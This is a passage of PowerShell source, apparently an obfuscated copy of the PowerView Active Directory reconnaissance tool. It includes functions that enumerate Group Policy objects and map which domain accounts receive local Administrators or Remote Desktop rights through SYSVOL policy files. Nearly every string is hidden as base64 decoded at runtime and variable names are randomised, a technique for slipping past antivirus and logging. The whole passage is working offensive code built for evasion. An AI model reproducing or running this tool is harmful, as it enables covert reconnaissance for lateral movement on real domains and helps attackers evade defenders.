('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAG4AYQBiAGwAZQAgAHQAbw
AgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByAC
AAZgBvAHIAIAAnACQAewA4ADQANAAyADMAYwBiAGYANQBhADUANAA0AGYAZAA2AGEAYQ
AwADUAZABjADcAMgAwADEAZgA4ADQAMgA1ADYAfQAnAA==')))
                   
         }
                        }
                    }
             
       elseif (${0c2b6ec1d84e4c9188d4d73c607426d3} -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ewAuACoAfQA=')))) {
                        
${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABuAGEAbQBlAD0AJAB7ADAAYwAyAGIANgBlAGMAMQBkADgANABlADQAYwA5ADEAOA
A4AGQANABkADcAMwBjADYAMAA3ADQAMgA2AGQAMwB9ACkA')))
                   
 }
                    else {
                        try {
            
                ${3e0cccb945b440b99b2100f08845f4a8} = (-Join 
(([Guid]${0c2b6ec1d84e4c9188d4d73c607426d3}).ToByteArray() | 
ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XAAkADEA')))
                           
 ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7ADMAZQAwAGMAYwBjAGIAOQA0ADUAYg
A0ADQAMABiADkAOQBiADIAMQAwADAAZgAwADgAOAA0ADUAZgA0AGEAOAB9ACkA')))
   
                     }
                        catch {
                
            ${987d1cda8c15450d8512978866836ba0} += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KABkAGkAcwBwAGwAYQB5AG4AYQBtAGUAPQAkAHsAMABjADIAYgA2AGUAYwAxAGQAOA
A0AGUANABjADkAMQA4ADgAZAA0AGQANwAzAGMANgAwADcANAAyADYAZAAzAH0AKQA=')
))
                        }
                    }
                }
    
            if (${987d1cda8c15450d8512978866836ba0} -and 
(${987d1cda8c15450d8512978866836ba0}.Trim() -ne '') ) {
              
      $Filter += $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB8ACQAewA5ADgANwBkADEAYwBkAGEAOABjADEANQA0ADUAMABkADgANQAxADIAOQ
A3ADgAOAA2ADYAOAAzADYAYgBhADAAfQApAA==')))
                }
          
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
   
                 Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABVAHMAaQBuAGcAIABhAGQAZA
BpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAF
AARgBpAGwAdABlAHIA')))
                    $Filter += 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
              
  ${75eab98b9e2d47af8ed389c47d53c203}.filter = 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwAFAAbw
BsAGkAYwB5AEMAbwBuAHQAYQBpAG4AZQByACkAJABGAGkAbAB0AGUAcgApAA==')))
   
             Write-Verbose "[Get-DomainGPO] filter string: 
$(${75eab98b9e2d47af8ed389c47d53c203}.filter)"
                if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { 
${9f78951ba80c437e9db41515f07bc24e} = 
${75eab98b9e2d47af8ed389c47d53c203}.FindOne() }
                else 
{ ${9f78951ba80c437e9db41515f07bc24e} = 
${75eab98b9e2d47af8ed389c47d53c203}.FindAll() }
                
${9f78951ba80c437e9db41515f07bc24e} | Where-Object {$_} | ForEach-
Object {
                    if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBhAHcA')))]) {
                        
${4c31ae76c0f64fb698a3074ad3ea5e60} = $_
                        
${4c31ae76c0f64fb698a3074ad3ea5e60}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwAuAFIAYQB3AA=='))))
              
      }
                    else {
                        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] -and 
($SearchBase -Match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('XgBHAEMAOgAvAC8A'))))) {
               
             ${4c31ae76c0f64fb698a3074ad3ea5e60} = Convert-
LDAPProperty -Properties $_.Properties
                            
try {
                                
${6c551f6b9c254083956551338129a73d} = 
${4c31ae76c0f64fb698a3074ad3ea5e60}.distinguishedname
                
                ${835bb0e0169d42999a8b623171fb7ee8} = 
${6c551f6b9c254083956551338129a73d}.SubString
(${6c551f6b9c254083956551338129a73d}.IndexOf
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
       
                         ${7be047cd33d147cda17c59445076689d} = "\\
${835bb0e0169d42999a8b623171fb7ee8}\SysVol\
${835bb0e0169d42999a8b623171fb7ee8}\Policies\
$(${4c31ae76c0f64fb698a3074ad3ea5e60}.cn)"
                           
     ${4c31ae76c0f64fb698a3074ad3ea5e60} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwBwAGMAZgBpAGwAZQBzAHkAcwBwAGEAdABoAA=='))) 
${7be047cd33d147cda17c59445076689d}
                            }
     
                       catch {
                                
Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: 
$(${4c31ae76c0f64fb698a3074ad3ea5e60}.distinguishedname)"
            
                }
                        }
                        
else {
                            
${4c31ae76c0f64fb698a3074ad3ea5e60} = Convert-LDAPProperty -
Properties $_.Properties
                        }
                    
    ${4c31ae76c0f64fb698a3074ad3ea5e60}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwA='))))
                    }
     
               ${4c31ae76c0f64fb698a3074ad3ea5e60}
                }
  
              if (${9f78951ba80c437e9db41515f07bc24e}) {
             
       try { ${9f78951ba80c437e9db41515f07bc24e}.dispose() }
         
           catch {
                        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAUABPAF0AIABFAHIAcgBvAHIAIABkAGkAcw
BwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAG
UAYwB0ADoAIAAkAF8A')))
                    }
                }
         
       ${75eab98b9e2d47af8ed389c47d53c203}.dispose()
            }
    
    }
    }
}
function Get-DomainGPOLocalGroup {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('DistinguishedName', 'SamAccountName', 
'Name')]
        [String[]]
        $Identity,
        [Switch]
        
$ResolveMembersToSIDs,
        [ValidateNotNullOrEmpty()]
        
[String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        
[Alias('Filter')]
        [String]
        $LDAPFilter,
        
[ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        
[String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
       
 [Alias('DomainController')]
        [String]
        $Server,
        
[ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        
$SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $Domain }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
  
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit 
}
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${862f5010d4134855b91a80cc000960e1} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${862f5010d4134855b91a80cc000960e1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${862f5010d4134855b91a80cc000960e1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${862f5010d4134855b91a80cc000960e1}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${a77ff0d39b404d67b3a1c9f29baa8e0a} = 
[System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
    
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))]) { 
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity }
        Get-DomainGPO 
@ea43c787582f45539b7f519da4680c7a | ForEach-Object {
            
${dd336d72664f4a9685dbed00a95b1e72} = $_.displayname
            
$GPOname = $_.name
            ${767ea09e55fa4a36b058019153b83208} = 
$_.gpcfilesyspath
            ${96fd7dc3c11c4955a085d10a19676226} =  
@{ 'GptTmplPath' = $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7ADcANgA3AGUAYQAwADkAZQA1ADUAZgBhADQAYQAzADYAYgAwADUAOAAwADEAOQ
AxADUAMwBiADgAMwAyADAAOAB9AFwATQBBAEMASABJAE4ARQBcAE0AaQBjAHIAbwBzAG
8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAE4AVABcAFMAZQBjAEUAZABpAHQAXABHAHAAdA
BUAG0AcABsAC4AaQBuAGYA'))) }
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${96fd7dc3c11c4955a085d10a19676226}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            
${7362ab9ba8994fab82e5ea31fd920d17} = Get-GptTmpl 
@96fd7dc3c11c4955a085d10a19676226
            if 
(${7362ab9ba8994fab82e5ea31fd920d17} -and 
(${7362ab9ba8994fab82e5ea31fd920d17}.psbase.Keys -contains 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwACAATQBlAG0AYgBlAHIAcwBoAGkAcAA='))))) {
               
 ${88c38f39fc204aa1a24468c526204d63} = @{}
                ForEach 
(${47f30890dfa342de81bf704f9296bef7} in 
${7362ab9ba8994fab82e5ea31fd920d17}.'Group 
Membership'.GetEnumerator()) {
                    
${b5a50316dca4465cad6cfeb0e116447c}, $Relation = 
${47f30890dfa342de81bf704f9296bef7}.Key.Split('__', 
${a77ff0d39b404d67b3a1c9f29baa8e0a}) | ForEach-Object {$_.Trim()}
    
                ${6b376ccad43d4b41b115e0d2fa701f64} = 
${47f30890dfa342de81bf704f9296bef7}.Value | Where-Object {$_} | 
ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                  
  if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
   
                     ${fd2fd6247841426c9afa3a2613aa3667} = @()
       
                 ForEach (${1b7dd34bbb37407f828b2f620f59a5e8} in 
${6b376ccad43d4b41b115e0d2fa701f64}) {
                            if 
(${1b7dd34bbb37407f828b2f620f59a5e8} -and 
(${1b7dd34bbb37407f828b2f620f59a5e8}.Trim() -ne '')) {
               
                 if (${1b7dd34bbb37407f828b2f620f59a5e8} -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAC4AKgA=')))) {
                                    
${7fcede2a665041ffa27ded0a82d2b484} = @{'ObjectName' = 
${1b7dd34bbb37407f828b2f620f59a5e8}}
                                 
   if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${7fcede2a665041ffa27ded0a82d2b484}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
                                  
  ${d9d94567d1d64890b48d411c7fe1749a} = ConvertTo-SID 
@7fcede2a665041ffa27ded0a82d2b484
                                    
if (${d9d94567d1d64890b48d411c7fe1749a}) {
                           
             ${fd2fd6247841426c9afa3a2613aa3667} += 
${d9d94567d1d64890b48d411c7fe1749a}
                                  
  }
                                    else {
                        
                ${fd2fd6247841426c9afa3a2613aa3667} += 
${1b7dd34bbb37407f828b2f620f59a5e8}
                                  
  }
                                }
                                
else {
                                    
${fd2fd6247841426c9afa3a2613aa3667} += 
${1b7dd34bbb37407f828b2f620f59a5e8}
                                
}
                            }
                        }
              
          ${6b376ccad43d4b41b115e0d2fa701f64} = 
${fd2fd6247841426c9afa3a2613aa3667}
                    }
             
       if (-not ${88c38f39fc204aa1a24468c526204d63}
[${b5a50316dca4465cad6cfeb0e116447c}]) {
                        
${88c38f39fc204aa1a24468c526204d63}
[${b5a50316dca4465cad6cfeb0e116447c}] = @{}
                    }
     
               if (${6b376ccad43d4b41b115e0d2fa701f64} -isnot 
[System.Array]) {${6b376ccad43d4b41b115e0d2fa701f64} = @
(${6b376ccad43d4b41b115e0d2fa701f64})}
                    
${88c38f39fc204aa1a24468c526204d63}
[${b5a50316dca4465cad6cfeb0e116447c}].Add($Relation, 
${6b376ccad43d4b41b115e0d2fa701f64})
                }
                
ForEach (${47f30890dfa342de81bf704f9296bef7} in 
${88c38f39fc204aa1a24468c526204d63}.GetEnumerator()) {
               
     if (${47f30890dfa342de81bf704f9296bef7} -and 
${47f30890dfa342de81bf704f9296bef7}.Key -and 
(${47f30890dfa342de81bf704f9296bef7}.Key -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBcACoA'))))) {
                        
${55e6f9b7e70241398335631b9e828ed6} = 
${47f30890dfa342de81bf704f9296bef7}.Key.Trim('*')
                    
    if (${55e6f9b7e70241398335631b9e828ed6} -and 
(${55e6f9b7e70241398335631b9e828ed6}.Trim() -ne '')) {
               
             $GroupName = ConvertFrom-SID -ObjectSID 
${55e6f9b7e70241398335631b9e828ed6} 
@862f5010d4134855b91a80cc000960e1
                        }
           
             else {
                            $GroupName = $False
   
                     }
                    }
                    else 
{
                        $GroupName = 
${47f30890dfa342de81bf704f9296bef7}.Key
                        if 
($GroupName -and ($GroupName.Trim() -ne '')) {
                       
     if ($Groupname -match $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzAA==')))) {
                    
            ${55e6f9b7e70241398335631b9e828ed6} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))
                            }
  
                          elseif ($Groupname -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAG0AbwB0AGUAIABEAGUAcwBrAHQAbwBwAA==')))) {
                    
            ${55e6f9b7e70241398335631b9e828ed6} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))
                            }
  
                          elseif ($Groupname -match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwB1AGUAcwB0AHMA')))) {
                                
${55e6f9b7e70241398335631b9e828ed6} = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))
                            }
  
                          elseif ($GroupName.Trim() -ne '') {
        
                        ${7fcede2a665041ffa27ded0a82d2b484} = @
{'ObjectName' = $Groupname}
                                if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${7fcede2a665041ffa27ded0a82d2b484}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
                                
${55e6f9b7e70241398335631b9e828ed6} = ConvertTo-SID 
@7fcede2a665041ffa27ded0a82d2b484
                            }
       
                     else {
                                
${55e6f9b7e70241398335631b9e828ed6} = $Null
                          
  }
                        }
                    }
                    
${99e435de2e8c4448bb98cb268b197bc1} = New-Object PSObject
            
        ${99e435de2e8c4448bb98cb268b197bc1} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) 
${dd336d72664f4a9685dbed00a95b1e72}
                    
${99e435de2e8c4448bb98cb268b197bc1} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8ATgBhAG0AZQA='))) $GPOName
                    
${99e435de2e8c4448bb98cb268b197bc1} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8AUABhAHQAaAA='))) ${767ea09e55fa4a36b058019153b83208}
       
             ${99e435de2e8c4448bb98cb268b197bc1} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwBQAE8AVAB5AHAAZQA='))) 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBlAHMAdAByAGkAYwB0AGUAZABHAHIAbwB1AHAAcwA=')))
                   
 ${99e435de2e8c4448bb98cb268b197bc1} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBpAGwAdABlAHIAcwA='))) $Null
                    
${99e435de2e8c4448bb98cb268b197bc1} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE4AYQBtAGUA'))) $GroupName
                    
${99e435de2e8c4448bb98cb268b197bc1} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAFMASQBEAA=='))) ${55e6f9b7e70241398335631b9e828ed6}
   
                 ${99e435de2e8c4448bb98cb268b197bc1} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RwByAG8AdQBwAE0AZQBtAGIAZQByAE8AZgA='))) 
${47f30890dfa342de81bf704f9296bef7}.Value.Memberof
                   
 ${99e435de2e8c4448bb98cb268b197bc1} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwByAG8AdQBwAE0AZQBtAGIAZQByAHMA'))) 
${47f30890dfa342de81bf704f9296bef7}.Value.Members
                    
${99e435de2e8c4448bb98cb268b197bc1}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
              
      ${99e435de2e8c4448bb98cb268b197bc1}
                }
           
 }
            ${96fd7dc3c11c4955a085d10a19676226} =  @{
              
  'GroupsXMLpath' = $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('JAB7ADcANgA3AGUAYQAwADkAZQA1ADUAZgBhADQAYQAzADYAYgAwADUAOAAwADEAOQ
AxADUAMwBiADgAMwAyADAAOAB9AFwATQBBAEMASABJAE4ARQBcAFAAcgBlAGYAZQByAG
UAbgBjAGUAcwBcAEcAcgBvAHUAcABzAFwARwByAG8AdQBwAHMALgB4AG0AbAA=')))
   
         }
            Get-GroupsXML 
@96fd7dc3c11c4955a085d10a19676226 | ForEach-Object {
                
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UgBlAHMAbwBsAHYAZQBNAGUAbQBiAGUAcgBzAFQAbwBTAEkARABzAA==')))]) {
   
                 ${fd2fd6247841426c9afa3a2613aa3667} = @()
           
         ForEach (${1b7dd34bbb37407f828b2f620f59a5e8} in 
$_.GroupMembers) {
                        if 
(${1b7dd34bbb37407f828b2f620f59a5e8} -and 
(${1b7dd34bbb37407f828b2f620f59a5e8}.Trim() -ne '')) {
               
             if (${1b7dd34bbb37407f828b2f620f59a5e8} -notmatch 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XgBTAC0AMQAtAC4AKgA=')))) {
                                
${7fcede2a665041ffa27ded0a82d2b484} = @{'ObjectName' = $Groupname}
   
                             if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))]) { ${7fcede2a665041ffa27ded0a82d2b484}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
                                
${d9d94567d1d64890b48d411c7fe1749a} = ConvertTo-SID -Domain $Domain 
-ObjectName ${1b7dd34bbb37407f828b2f620f59a5e8}
                      
          if (${d9d94567d1d64890b48d411c7fe1749a}) {
                 
                   ${fd2fd6247841426c9afa3a2613aa3667} += 
${d9d94567d1d64890b48d411c7fe1749a}
                                
}
                                else {
                              
      ${fd2fd6247841426c9afa3a2613aa3667} += 
${1b7dd34bbb37407f828b2f620f59a5e8}
                                
}
                            }
                            else {
     
                           ${fd2fd6247841426c9afa3a2613aa3667} += 
${1b7dd34bbb37407f828b2f620f59a5e8}
                            }
     
                   }
                    }
                    
$_.GroupMembers = ${fd2fd6247841426c9afa3a2613aa3667}
                
}
                $_ | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8ARABpAHMAcABsAGEAeQBOAGEAbQBlAA=='))) 
${dd336d72664f4a9685dbed00a95b1e72}
                $_ | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RwBQAE8ATgBhAG0AZQA='))) $GPOName
      
          $_ | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RwBQAE8AVAB5AHAAZQA='))) $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RwByAG8AdQBwAFAAbwBsAGkAYwB5AFAAcgBlAGYAZQByAGUAbgBjAGUAcwA=')))
   
             $_.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBHAFAATwBHAHIAbwB1AHAA'))))
              
  $_
            }
        }
    }
}
function Get-
DomainGPOUserLocalGroupMapping {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    
Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
     
   $Identity,
        [String]
        [ValidateSet('Administrators', 
'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
      
  $LocalGroup = 'Administrators',
        [ValidateNotNullOrEmpty()]
  
      [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
     
   [Alias('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${9b01c2de50194ad7be1c5b6ceb9278d7} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))]) { ${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { 
${9b01c2de50194ad7be1c5b6ceb9278d7}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
